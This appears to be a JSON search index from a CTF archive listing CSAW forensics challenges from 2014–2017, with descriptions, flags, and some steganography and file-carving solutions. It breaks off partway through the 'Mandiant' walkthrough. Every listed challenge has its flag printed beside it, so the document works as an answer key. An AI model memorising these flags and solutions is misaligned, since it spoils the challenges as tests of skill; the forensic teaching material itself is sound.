            "location": "/challenges/2016/forensics/Watchword/", 
            "text": "Watchword\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nCanned epic hidden snek flavored cookies have shy gorilla.\n\n\nFlag\n\n\nflag{We are fsociety, we are finally free, we are finally awake!}\n\n\nSolution\n\n\nThe description \"canned\" hints toward the file having more files within it. powpow.mp4 has a png appended to it. \nThe description \"epic hidden snek flavored\" hints at the module stepic. Using stepic to write the output to a different file reveals a jpg.\npowpow.mp4 's properties show that the Artist is Stefan Hetzl, the Title is \naHR0cDovL3N0ZWdoaWRlLnNvdXJjZWZvcmdlLm5ldC8=\n, and the file was last modified October 09, 2003 (the last update to the steghide website). This points to steghide, since the title is base64 for \nsteghide's website\n. The title of the challenge is \"Watchword\", which is a synonym for password. Using steghide and the password \"password\" on the jpg reveals a text file.\nThe text file is Base85 for the flag.\n\n\nforemost\n \npowpow\n.\nmp4\n\n\nstepic\n \n-\ni\n \noutput\n/\npng\n/\n00001069.\npng\n \n-\nd\n \n \nthing\n\n\nsteghide\n \nextract\n \n-\nsf\n \nthing\n.\njpg\n \n-\np\n \npassword\n\n\ncat\n \nbase64\n.\ntxt\n\n\npython3\n\n\n \nimport\n \nbase64\n\n\n \nbase64\n.\nb85decode\n(\nb\nW^7?+dsk\n3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU}c_3kTVQXa}eE\n)\n\n\nb\nflag{We are fsociety, we are finally free, we are finally awake!}", 
            "title": "Watchword"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#watchword", 
            "text": "", 
            "title": "Watchword"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#description", 
            "text": "Canned epic hidden snek flavored cookies have shy gorilla.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#flag", 
            "text": "flag{We are fsociety, we are finally free, we are finally awake!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/Watchword/#solution", 
            "text": "The description \"canned\" hints toward the file having more files within it. powpow.mp4 has a png appended to it. \nThe description \"epic hidden snek flavored\" hints at the module stepic. Using stepic to write the output to a different file reveals a jpg.\npowpow.mp4 's properties show that the Artist is Stefan Hetzl, the Title is  aHR0cDovL3N0ZWdoaWRlLnNvdXJjZWZvcmdlLm5ldC8= , and the file was last modified October 09, 2003 (the last update to the steghide website). This points to steghide, since the title is base64 for  steghide's website . The title of the challenge is \"Watchword\", which is a synonym for password. Using steghide and the password \"password\" on the jpg reveals a text file.\nThe text file is Base85 for the flag.  foremost   powpow . mp4  stepic   - i   output / png / 00001069. png   - d     thing  steghide   extract   - sf   thing . jpg   - p   password  cat   base64 . txt  python3    import   base64    base64 . b85decode ( b W^7?+dsk 3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU}c_3kTVQXa}eE )  b flag{We are fsociety, we are finally free, we are finally awake!}", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/", 
            "text": "Phish It, Phish It Good\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nSomeone got phished after running an executable, help me find out what info the attacker obtained.\nNote: The format for this challenge is key{}\n\n\nFlag\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nbustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z", 
            "title": "Phish it, Phish it Good"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#phish-it-phish-it-good", 
            "text": "", 
            "title": "Phish It, Phish It Good"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#author", 
            "text": "Antoniewicz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#description", 
            "text": "Someone got phished after running an executable, help me find out what info the attacker obtained.\nNote: The format for this challenge is key{}", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/phish-it-phish-it-good/#setup", 
            "text": "Distribute  bustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/", 
            "text": "Pcap'in\n\n\nAuthor\n\n\nNevens\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe have extracted a pcap file from a network where attackers were present.  We know they were using some kind of file transfer protocol on TCP port 7179.  We're not sure what file or files were transferred and we need you to investigate.  We do not believe any strong cryptography was employed.\n\n\nFlag\n\n\ns1mp\n!\n3\n_n37w0rk_c4\n@1l3\nnge\n\n\nSolution\n\n\nSetup", 
            "title": "Pcapin"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#pcapin", 
            "text": "", 
            "title": "Pcap'in"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#author", 
            "text": "Nevens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#description", 
            "text": "We have extracted a pcap file from a network where attackers were present.  We know they were using some kind of file transfer protocol on TCP port 7179.  We're not sure what file or files were transferred and we need you to investigate.  We do not believe any strong cryptography was employed.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#flag", 
            "text": "s1mp ! 3 _n37w0rk_c4 @1l3 nge", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/pcapin/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/", 
            "text": "Keep Calm and CTF\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nMy friend sends me pictures before every ctf. He told me this one was special.\nNote: this flag doesn't follow the \nflag{}\n format\n\n\nFlag\n\n\nh1d1ng_in_4lm0st_pla1n_sigh7\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nkeep-calm-and-ctf.jpg", 
            "title": "Keep Calm and CTF"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#keep-calm-and-ctf", 
            "text": "", 
            "title": "Keep Calm and CTF"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#description", 
            "text": "My friend sends me pictures before every ctf. He told me this one was special.\nNote: this flag doesn't follow the  flag{}  format", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#flag", 
            "text": "h1d1ng_in_4lm0st_pla1n_sigh7", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#setup", 
            "text": "Distribute  keep-calm-and-ctf.jpg", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/net/", 
            "text": "Net/Flash\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nI was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.\n\n\nFlag\n\n\nflag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}\n\n\nSolution\n\n\nSetup", 
            "title": "Transfer"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#netflash", 
            "text": "", 
            "title": "Net/Flash"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#description", 
            "text": "I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#flag", 
            "text": "flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/net/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/", 
            "text": "Flash\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe were able to grab an image of a harddrive. Find out what's on it.\n\n\nFlag\n\n\nflag{b3l0w_th3_r4dar}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nflash_c8429a430278283c0e571baebca3d139.zip", 
            "title": "Flash"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#flash", 
            "text": "", 
            "title": "Flash"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#description", 
            "text": "We were able to grab an image of a harddrive. Find out what's on it.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#flag", 
            "text": "flag{b3l0w_th3_r4dar}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/flash/#setup", 
            "text": "Distribute  flash_c8429a430278283c0e571baebca3d139.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/", 
            "text": "Dumpster Diving\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\ndumpsters are cool, but cores are cooler\n\n\nFlag\n\n\nflag{0cb5b778715ccb6b300892e974e2f427}\n\n\nSolution\n\n\nDump of firefox memory with the string loaded in. Strings it. Grep for flag.\n\n\nSetup\n\n\nDistribute \nfirefox.mem", 
            "title": "Dumptster Diving"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#dumpster-diving", 
            "text": "", 
            "title": "Dumpster Diving"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#description", 
            "text": "dumpsters are cool, but cores are cooler", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#flag", 
            "text": "flag{0cb5b778715ccb6b300892e974e2f427}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#solution", 
            "text": "Dump of firefox memory with the string loaded in. Strings it. Grep for flag.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/forensics/dumpster_diving/#setup", 
            "text": "Distribute  firefox.mem", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/", 
            "text": "Missed Registration\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nIt's registration day! These forms just seem longer and longer...\n\n\nFlag\n\n\nFLAG{3Am_LaunDR3Y_FL4G_L34kz!}\n\n\nSolution\n\n\nsolve.py\n\n\nFile for challenge\n\n\ncap.pcap", 
            "title": "Best Router"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#missed-registration", 
            "text": "", 
            "title": "Missed Registration"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#description", 
            "text": "It's registration day! These forms just seem longer and longer...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#flag", 
            "text": "FLAG{3Am_LaunDR3Y_FL4G_L34kz!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#file-for-challenge", 
            "text": "cap.pcap", 
            "title": "File for challenge"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/", 
            "text": "thoroughlyStripped\n\n\nAuthor\n\n\nKyle Martin\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nDumped by my core, left to bleed out bytes on the heap, I was stripped of my dignity... The last thing I could do was to let other programs strip me of my null-bytes just so my memory could live on.\n\n\nFlag\n\n\nflag{stay_in_college_kids}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\nDistribute core dump", 
            "title": "Thoroughly Stripped"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#thoroughlystripped", 
            "text": "", 
            "title": "thoroughlyStripped"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#author", 
            "text": "Kyle Martin", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#description", 
            "text": "Dumped by my core, left to bleed out bytes on the heap, I was stripped of my dignity... The last thing I could do was to let other programs strip me of my null-bytes just so my memory could live on.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#flag", 
            "text": "flag{stay_in_college_kids}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/forensics/thoroughlyStripped/#setup", 
            "text": "Distribute core dump", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/", 
            "text": "Pure Poetry\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe've been told that this file is pure poetry. Whatever that is supposed to mean. A key is embedded in it, in the form CSAW{KEY}.\nWe've also been told that 128 is a magic number that might be useful to solving this challenge.\n\n\nFlag\n\n\nCSAW{AGoodChallengeGrowsBothAuthorAndAudienceLikeAGoodPoem}\n\n\nSolution", 
            "title": "Pure Poetry"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#pure-poetry", 
            "text": "", 
            "title": "Pure Poetry"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#description", 
            "text": "We've been told that this file is pure poetry. Whatever that is supposed to mean. A key is embedded in it, in the form CSAW{KEY}.\nWe've also been told that 128 is a magic number that might be useful to solving this challenge.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#flag", 
            "text": "CSAW{AGoodChallengeGrowsBothAuthorAndAudienceLikeAGoodPoem}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/pure_poetry/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/", 
            "text": "Yaar Haar Fiddle Dee Dee\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nDO WHAT YE WANT 'CAUSE A PIRATE IS FREE. YOU ARE A PIRATE!\n\n\nFlag\n\n\nflag{b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3}\n\n\nSolution\n\n\nThe challenge name, \"YAAR HAAR FIDDLE DEE DEE\" is a reference to a viral youtube video, as well as a hint. The description is just some of the lyrics of the viral song.\nThe challenge is a pcap of a \"conversation\" created with python sockets. There 3 base 64 encoded strings, one is just a blob of 100x100 grayscale images, one is an encrypted zip file, and one is an xml file which is formatted to opencv's haar cascade format. Players must seperate out the images, load the haar cascade file with opencv and run it against the images in the file, all of this, as well as the parameters required, are alluded to in the dialog that is also in the pcap. They will also need to draw a square over the object that the haar cascade detects, so that they can successfully identify it as a \"skull and crossbones\", which is then the password for the encrypted zip file (without spaces, as stated in the pcap), which contains flag.txt. the dialog also helpfully states that the map (the cascade file) points to the key (the skull and crossbones) for the booty (the zip file), and also says no spaces and no capitalized letters.\n1. extract base64 strings, decode into 3 different files\n2. \nbinwalk -e\n the image blob\n3. use opencv python docs to write a haar cascade script\n4. identify the jollyroger and use that as the password for the zip\n5. \ncat flag.txt", 
            "title": "Yaar Haar Fiddle Dee Dee"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#yaar-haar-fiddle-dee-dee", 
            "text": "", 
            "title": "Yaar Haar Fiddle Dee Dee"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#description", 
            "text": "DO WHAT YE WANT 'CAUSE A PIRATE IS FREE. YOU ARE A PIRATE!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#flag", 
            "text": "flag{b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/Yaar_Haar_Fiddle_Dee_Dee/#solution", 
            "text": "The challenge name, \"YAAR HAAR FIDDLE DEE DEE\" is a reference to a viral youtube video, as well as a hint. The description is just some of the lyrics of the viral song.\nThe challenge is a pcap of a \"conversation\" created with python sockets. There 3 base 64 encoded strings, one is just a blob of 100x100 grayscale images, one is an encrypted zip file, and one is an xml file which is formatted to opencv's haar cascade format. Players must seperate out the images, load the haar cascade file with opencv and run it against the images in the file, all of this, as well as the parameters required, are alluded to in the dialog that is also in the pcap. They will also need to draw a square over the object that the haar cascade detects, so that they can successfully identify it as a \"skull and crossbones\", which is then the password for the encrypted zip file (without spaces, as stated in the pcap), which contains flag.txt. the dialog also helpfully states that the map (the cascade file) points to the key (the skull and crossbones) for the booty (the zip file), and also says no spaces and no capitalized letters.\n1. extract base64 strings, decode into 3 different files\n2.  binwalk -e  the image blob\n3. use opencv python docs to write a haar cascade script\n4. identify the jollyroger and use that as the password for the zip\n5.  cat flag.txt", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/", 
            "text": "Yaar Haar 2: Dead Man's Flag\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWE'VE GOT US A MAP (A MAP!) TO LEAD US TO ME LOST MATEYS!\n\n\nUPDATE: Re-read the intro message when connecting.\n\nnc misc.chal.csaw.io 1344\n\n\nFlag\n\n\nflag{lazytown_is_best_town}\n\n\nSolution", 
            "title": "Yaar Haar 2"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#yaar-haar-2-dead-mans-flag", 
            "text": "", 
            "title": "Yaar Haar 2: Dead Man's Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#description", 
            "text": "WE'VE GOT US A MAP (A MAP!) TO LEAD US TO ME LOST MATEYS!  UPDATE: Re-read the intro message when connecting. nc misc.chal.csaw.io 1344", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#flag", 
            "text": "flag{lazytown_is_best_town}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/yaar_haar_2/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/", 
            "text": "Airport\n\n\nAuthor\n\n\nHudson\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe got a bunch of photos from our contact, but can't make anything out of them.\n\n\nFlag\n\n\niH4t3A1rp0rt5\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nairport_26321e6eac7a7490e527cbe27ceb68c1.zip", 
            "title": "Airport"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#airport", 
            "text": "", 
            "title": "Airport"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#author", 
            "text": "Hudson", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#description", 
            "text": "We got a bunch of photos from our contact, but can't make anything out of them.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#flag", 
            "text": "iH4t3A1rp0rt5", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/airport/#setup", 
            "text": "Distribute  airport_26321e6eac7a7490e527cbe27ceb68c1.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/", 
            "text": "Obscurity\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nsee or do not see\n\n\nFlag\n\n\nflag{security_through_obscurity}\n\n\nSolution\n\n\nPDF has a hidden text box in it. Doesn't show up in strings, but if you hover over it, the textbox will let you select the text and copy it out.\n\n\nSetup\n\n\nDistribute \npdf.pdf", 
            "title": "Obscurity"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#obscurity", 
            "text": "", 
            "title": "Obscurity"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#description", 
            "text": "see or do not see", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#flag", 
            "text": "flag{security_through_obscurity}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#solution", 
            "text": "PDF has a hidden text box in it. Doesn't show up in strings, but if you hover over it, the textbox will let you select the text and copy it out.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/forensics/obscurity/#setup", 
            "text": "Distribute  pdf.pdf", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/", 
            "text": "Why not SFTP?\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nwell seriously, why not? \n\n\nFlag\n\n\nflag{91e02cd2b8621d0c05197f645668c5c4}\n\n\nSolution\n\n\nFTP session. Extract transferred files.\n\n\nSetup\n\n\nDistribute \ntraffic-5.pcap", 
            "title": "Why Not SFTP"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#why-not-sftp", 
            "text": "", 
            "title": "Why not SFTP?"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#author", 
            "text": "Budofsky", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#description", 
            "text": "well seriously, why not?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#flag", 
            "text": "flag{91e02cd2b8621d0c05197f645668c5c4}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#solution", 
            "text": "FTP session. Extract transferred files.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/forensics/why_not_sftp__/#setup", 
            "text": "Distribute  traffic-5.pcap", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/", 
            "text": "Mandiant\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe found this file. Help Mandiant figure out what APT1 is trying to send.\nHint: check out free_file_camouflage\n\n\nFlag\n\n\nflag{s3v3r4l_l4y3r5_d33p_\n_2m4ny_l4yers_w1d3}\n\n\nSolution\n\n\nby \npolym\n\nThis writeup is based on a writeup by \nkrx\n.\nWe are given a PDF that contains an EmbeddedFile object stream, see \n7.11.4 of the official PDF specification by Adobe\n.\nUsing \nqpdf\n and a common text editor, we can extract the embedded file (base64 encoded) in a simple manner:\n\n\n$ qpdf --qdf --object-streams\n=\ndisable Mandiant_c920fc463eaf996489749457abc9b2eb.pdf out.pdf\n\n\n\n\n\n\nWe decode it using \nbase64 --decode\n to find a PNG:\n\n\n$ cat out.b64 \n|\n tr -d \n\\n\n \n|\n b64d pic.png \n$ file pic.png\npic.png: PNG image data, \n610\n x \n467\n, \n8\n-bit/color RGBA, non-interlaced\n\n\n\n\n\nThe PNG contains a 7-zip archive, which we extract using \nscalpel\n using a modified version of \nthis config\n:\n\n\n$ binwalk pic.png \n|\n grep -v Zlib\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n0\n             0x0             PNG image, \n610\n x \n467\n, \n8\n-bit/color RGBA, non-interlaced\n\n160173\n        0x271AD         \n7\n-zip archive data, version \n0\n.4\n$ scalpel -vc scalpel.conf pic.png\n$ tree scalpel-output/\nscalpel-output/\n\u251c\u2500\u2500 7z-10-0\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 \n00000000\n.7z\n\u2514\u2500\u2500 audit.txt\n\n\n1\n directory, \n2\n files\n\n\n\n\n\nInside the 7z there is a JPG (also base64 encoded), which we extract using \n7z\n:\n\n\n+bash-4.3$ \ncd\n 7z-10-0/\n+bash-4.3$ ls\n\n00000000\n.7z\n+bash-4.3$ 7z x \n00000000\n.7z -oout\n\n\n7\n-Zip \n[\n64\n]\n \n9\n.20  Copyright \n(\nc\n)\n \n1999\n-2010 Igor Pavlov  \n2010\n-11-18\np7zip Version \n9\n.20 \n(\nlocale\n=\nutf8,Utf16\n=\non,HugeFiles\n=\non,8 CPUs\n)\n\n\nProcessing archive: \n00000000\n.7z\n\nExtracting  secret.txt\n\nEverything is Ok\n\nSize:       \n58375\n\nCompressed: \n43850\n\n+bash-4.3$ tree out/\nout/\n\u2514\u2500\u2500 